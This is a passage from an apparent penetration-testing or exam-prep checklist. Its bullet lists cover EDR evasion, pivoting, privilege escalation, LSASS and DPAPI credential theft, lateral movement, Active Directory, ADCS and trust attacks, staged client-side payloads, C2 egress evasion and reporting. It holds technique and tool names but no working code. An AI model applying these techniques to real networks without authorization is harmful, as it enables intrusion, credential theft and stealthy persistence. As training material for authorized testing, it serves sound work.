  • Use direct/indirect syscalls (Hell's Gate / Halo's Gate / Syswhispers) to bypass userland hooks for injection primitives
  • Patch ETW (EtwEventWrite) in-process to suppress .NET / CLR telemetry before loading assemblies
  • Account for AMSI in non-PowerShell contexts (WSH/JScript, Excel 4.0/XLM, .NET assembly load)
  • Escape Constrained Language Mode via custom runspaces, InstallUtil, or downgrade to PowerShell v2
  • Sign payloads / use trusted-publisher or LOLBAS execution to satisfy WDAC/AppLocker publisher rules
  • Add sleep masks, jitter, and encrypted beacons to evade in-memory and network detection
  • Test the final artifact against Defender/EDR offline (AMSITrigger, ThreatCheck, DefenderCheck) to locate and fix flagged bytes

11.4 Tunneling & Pivoting

  • Establish a foothold tunnel (Ligolo-ng, sshuttle, or Metasploit routing / portfwd)
  • Map reachable internal subnets and pivot deeper as you move
  • Forward ports / use proxychains for tooling that can't route natively
  • Chain multiple pivots (double/triple hop) as you reach deeper segments and isolated VLANs
  • Local and remote port forwards to reach single services (RDP, MSSQL, WinRM) behind the pivot
  • Stand up a SOCKS proxy for browser/tooling access to internal web apps and dashboards
  • Route C2 traffic through the pivot host or use SMB/named-pipe peer-to-peer beacons in segmented networks
  • Re-scan from the new vantage point; internal hosts often expose far more than the perimeter

11.5 Privilege Escalation

  • Situational awareness: whoami /all, privileges, users, groups, software, services
  • Windows: token abuse (SeImpersonate → Potato), AlwaysInstallElevated, service/binary hijacks, UAC bypass
  • Linux: SUID / capabilities, sudo rules, cron jobs, writable services, kernel exploits
  • Run automated enumeration (WinPEAS/LinPEAS/Seatbelt/PowerUp) and triage the findings
  • Check unquoted service paths, weak service permissions, and modifiable service binaries/registry
  • Hunt DLL hijacking / DLL search-order opportunities in privileged or auto-running processes
  • Enumerate token privileges (SeImpersonate, SeAssignPrimaryToken, SeBackup, SeRestore, SeDebug) and abuse the relevant one
  • Inspect scheduled tasks, startup items, and autoruns for writable targets
  • Search for stored credentials in files, registry, GPP, and the Credential Manager for a quick win
  • Bypass UAC to move from medium to high integrity when you control a local admin user
  • Linux: writable PATH, library hijacking (LD_PRELOAD/LD_LIBRARY_PATH), and misconfigured NFS/root squashing

11.6 Credential Access

  • Dump credentials from LSASS / SAM with Mimikatz (disable PPL if required)
  • Harvest from the registry, DPAPI, browsers, and configuration files
  • Crack captured hashes offline; spray valid credentials across the domain
  • Dump LSASS stealthily (comsvcs.dll MiniDump, nanodump, or process-clone) and parse the dump offline
  • Decrypt DPAPI-protected secrets (masterkeys, vaults, browser/Wi-Fi/RDP creds) using the user or domain backup key
  • Extract LSA secrets, cached domain logons (DCC2/mscash), and service account passwords from SAM/SECURITY hives
  • Password-spray validated credentials/patterns carefully, respecting lockout policy
  • Enumerate and impersonate available access tokens of higher-privileged logged-on users
  • Capture credentials via clipboard, keylogging, or a fake auth prompt where appropriate
  • Read gMSA passwords where the foothold account is authorized (ReadGMSAPassword)

11.7 Lateral Movement

  • Pass-the-Hash / Pass-the-Ticket / Overpass-the-Hash to reach new hosts
  • Execute remotely via PsExec / WMI / WinRM / scheduled tasks
  • Relay attacks (ntlmrelayx) where SMB signing is not enforced
  • Use BloodHound to pick the shortest path to a new privileged host or session
  • Move laterally via DCOM (MMC20, ShellWindows) when SMB/WMI are blocked or monitored
  • Hijack RDP sessions / use restricted-admin RDP with a hash where interactive access is needed
  • Coerce authentication (PetitPotam, PrinterBug, Coercer) to feed a relay or capture a hash
  • Relay coerced NTLM to LDAP/LDAPS (RBCD, ADCS) or to MSSQL/SMB to escalate without cracking
  • Hunt for privileged user sessions to harvest tokens/tickets and move toward DA

11.8 Active Directory Attacks

  • Enumerate the domain with BloodHound, PowerView, and LDAP; map attack paths
  • Kerberos: Kerberoasting, AS-REP roasting, and delegation abuse (unconstrained / constrained / RBCD)
  • Abuse ACLs and Group Policy to reach Domain Admin
  • DCSync and dump NTDS.dit; establish persistence (Golden / Silver Ticket)
  • Enumerate SPNs and service accounts; prioritize high-value, crackable Kerberoast targets
  • Find accounts without Kerberos pre-auth and AS-REP roast them
  • Abuse writable GPOs / GPO links to push immediate code execution or new local admins
  • Read LAPS passwords where the account is authorized to recover local admin access
  • Forge Silver Tickets for targeted service access using a captured service key
  • Forge a Golden Ticket from the krbtgt hash for domain-wide persistence
  • Establish durable persistence (skeleton key, DSRM, AdminSDHolder, ACL backdoor) where the objective requires it
  • Exfiltrate and parse NTDS.dit offline (secretsdump) to recover every domain hash

11.9 MSSQL Server Attacks

  • Authenticate and enumerate SQL instances; check for sysadmin / impersonation rights
  • Gain execution via xp_cmdshell or custom CLR assemblies
  • Abuse linked servers to pivot and execute across trust relationships
  • Discover SQL instances via SPNs, browser service (UDP 1434), and BloodHound
  • Enumerate and abuse EXECUTE AS / IMPERSONATE chains to reach sysadmin
  • Relay or coerce SQL service authentication; relay to other SQL servers or LDAP
  • Use OLE Automation procedures or registry/agent jobs when xp_cmdshell is disabled
  • Recover linked-server and stored connection credentials for further pivoting

11.10 Client-Side Attack Vectors

  • Build a VBA macro payload (Word/Excel) with an encrypted, staged loader rather than raw shellcode
  • Use AutoOpen/Document_Open/Workbook_Open triggers and remote-template injection where direct macros are blocked
  • Consider Excel 4.0 (XLM) macros or VBA-stomping to reduce static detection
  • Build an HTA payload (mshta) with embedded VBScript/JScript and an obfuscated stager
  • Build a JScript/WSH (.js/.wsf) loader; abuse DotNetToJScript or GadgetToJScript to run a .NET assembly
  • Weaponize LNK / ISO / IMG / OneNote containers to bypass mark-of-the-web and gateway filtering
  • Use calendar/meeting invite phishing or OWA rules where email body/attachment filters are strict
  • Stage 1: minimal first-stage downloader that fetches the encrypted second stage over HTTPS
  • Stage 2: decrypt in memory and execute via a reflective loader (no disk artifacts)
  • Reflectively load a PE/.NET assembly in-memory (Donut, reflective DLL injection)
  • Process hollowing: spawn a suspended legit process, unmap/overwrite its image, and resume into your payload
  • Process injection (CreateRemoteThread, APC queue, thread hijack, early-bird) into a trusted host process
  • Spoof the parent PID and command line so the child process looks benign in telemetry
  • Add guardrails: domain/user/locale checks and sandbox evasion so the payload only fires on the real target
  • Establish user-level persistence (Run key, scheduled task, startup) on the client foothold

11.11 Network Filter & Egress Evasion

  • Profile egress: which ports/protocols leave the network (80/443/53), and whether a proxy is enforced
  • Make C2/stager proxy-aware (system proxy, NTLM/Kerberos auth) to traverse the corporate web proxy
  • Use an aged, categorized C2 domain and clean TLS to pass web-proxy category/reputation filters
  • Domain-front C2 through a trusted CDN (front a high-reputation SNI/Host) to evade SNI/domain filtering
  • Use DNS tunneling (iodine/dnscat2/C2 DNS channel) when only DNS resolves outbound
  • Defeat DNS filters by using the internal resolver as the upstream for the DNS channel
  • Evade IDS/IPS signatures: encrypt payloads, randomize URIs/user-agents, add jitter and malleable profiles
  • Blend TLS fingerprint (JA3/JA3S, valid cert, common ALPN) so beacons resemble normal browser traffic
  • Prefer HTTPS over a trusted redirector with realistic headers and traffic shaping
  • Configure fallback channels (HTTP → DNS → SMB) so loss of one egress path does not kill C2

11.12 Kiosk / Restricted Environment Breakout

  • Enumerate the restriction mechanism (kiosk app, Citrix/RDS published app, browser lockdown, GPO restrictions)
  • Abuse common dialogs (File → Open/Save, Print, Help) to reach a file browser or address bar
  • Use URI handlers, UNC paths, and file:///\\server\share navigation to escape the application sandbox
  • Abuse keyboard shortcuts and accessibility features (Sticky Keys, Win+R, Ctrl+Shift+Esc) to spawn a shell
  • Break out of locked browsers via address bar, downloads, dev tools, or external protocol handlers
  • Reach explorer.exe / cmd.exe / powershell.exe through embedded controls or LOLBAS launchers
  • Identify and bypass AppLocker/WDAC policy in the kiosk to run arbitrary tooling
  • Citrix/RDS: escape the published app to a full desktop, then enumerate the underlying session host
  • Once broken out, drop a runner and re-establish C2 from inside the restricted host

11.13 Kerberos Delegation Abuse

  • Enumerate delegation settings across the domain (unconstrained, constrained, RBCD) with PowerView/BloodHound
  • Unconstrained: compromise a host with unconstrained delegation, capture cached TGTs of authenticating users
  • Coerce a DC (PrinterBug/PetitPotam) to authenticate to the unconstrained host and capture the DC's TGT
  • Constrained (S4U2Proxy): abuse an account trusted for delegation to specific SPNs to impersonate any user to that service
  • Use S4U2Self + S4U2Proxy (Rubeus s4u) to obtain a service ticket as a high-privileged user
  • Exploit protocol transition (TrustedToAuthForDelegation) to impersonate without the user's initial Kerberos auth
  • RBCD: with write access to a computer object, set msDS-AllowedToActOnBehalfOfOtherIdentity to a controlled account and S4U to it
  • Create or take over a machine account (MachineAccountQuota) to use as the RBCD source principal
  • Shadow Credentials: write msDS-KeyCredentialLink (Whisker/Certipy) to authenticate as the object via PKINIT and recover its NT hash
  • Abuse the altservice trick to retarget a constrained-delegation ticket to another SPN on the same host
  • Inject the resulting service ticket (PTT) and access the target service (CIFS, HOST, HTTP, LDAP, MSSQL)

11.14 AD ACL & Object Permission Abuse

  • Map object ACLs with BloodHound; identify principals you control that have dangerous rights
  • GenericAll / GenericWrite over a user: set an SPN and targeted-Kerberoast, or reset attributes to take over
  • ForceChangePassword: reset a target user's password to gain control of the account
  • Targeted Kerberoast: temporarily add an SPN to a user you can write, roast, then remove the SPN
  • WriteDACL: grant yourself additional rights (e.g. DCSync) on the object or domain head
  • WriteOwner: take ownership of the object, then write a DACL granting full control
  • GenericAll/WriteMembers over a group: add a controlled user to a privileged group
  • GenericWrite over a computer: configure RBCD or write shadow credentials to take it over
  • WriteProperty/WriteDACL on a GPO: edit the GPO to push code execution or add local admins
  • Grant DS-Replication-Get-Changes / All on the domain object to enable DCSync from a low-priv principal
  • Record and revert every ACL/SPN/attribute change you make for clean-up and reporting

11.15 AD Certificate Services (ADCS)

  • Enumerate CAs and certificate templates (Certify find / Certipy find) and flag vulnerable ESC configurations
  • ESC1: template allows requester-supplied SAN with client-auth EKU and low enrollment rights → request a cert as any user (e.g. Domain Admin)
  • ESC2: template with Any Purpose / no EKU restriction → use it to authenticate or sign as an arbitrary principal
  • ESC3: abuse an Enrollment Agent template to request certificates on behalf of other users
  • ESC4: you have write access over a template's ACL → reconfigure it into an ESC1-style vulnerable template
  • ESC5: compromise CA-related objects (CA computer, PKI objects) via their object ACLs
  • ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set → supply an arbitrary SAN on any template
  • ESC7: you hold ManageCA / ManageCertificates rights → enable an attack, approve a request, or grant enrollment
  • ESC8: relay NTLM (coerced DC auth) to the CA web-enrollment endpoint to obtain a DC/user certificate
  • Authenticate with the malicious certificate via PKINIT to obtain a TGT (Rubeus asktgt / Certipy auth)
  • Recover the account's NT hash from the PKINIT TGT (UnPAC-the-hash) for further use
  • Use a long-lived user/machine certificate for stealthy persistence that survives password resets

11.16 Domain & Forest Trust Attacks

  • Enumerate domain/forest trusts, their direction, and transitivity (PowerView, nltest, BloodHound)
  • Intra-forest: escalate from child to parent (forest root) using a Golden Ticket with SID history of Enterprise Admins
  • Inject the parent-domain Enterprise Admins SID into a forged ticket's SID history (no SID filtering inside a forest)
  • Dump the inter-realm trust key (trust account hash) to forge inter-realm TGTs across the trust
  • Forge an inter-realm referral ticket with the trust key to access resources in the trusting domain
  • Cross-forest: account for SID filtering; abuse foreign-group memberships, ACLs, and shared local-admin access instead
  • Enumerate foreign security principals and foreign group members that grant access across the trust boundary
  • Kerberoast/AS-REP roast across trusts where target SPNs/accounts are reachable through the trust
  • Abuse cross-forest ADCS enrollment or PKI trust where a CA is shared/trusted between forests

11.17 Objectives & Reporting

  • Collect all flags (local.txt / proof.txt) via interactive shells
  • Document each step with commands, screenshots, and timestamps for the report
  • Re-read the engagement objectives and confirm every required goal/flag is achieved
  • Prove domain compromise (DA/EA access, DCSync, NTDS dump) with clear evidence
  • Catalogue looted credentials, tickets, and certificates with where each was obtained
  • Clean up artifacts: remove payloads, revert ACL/SPN/template changes, and note anything left behind
  • Build an attack-path timeline tying each foothold and escalation together for the narrative
  • Provide actionable remediation for each finding (config, patch, hardening, detection)
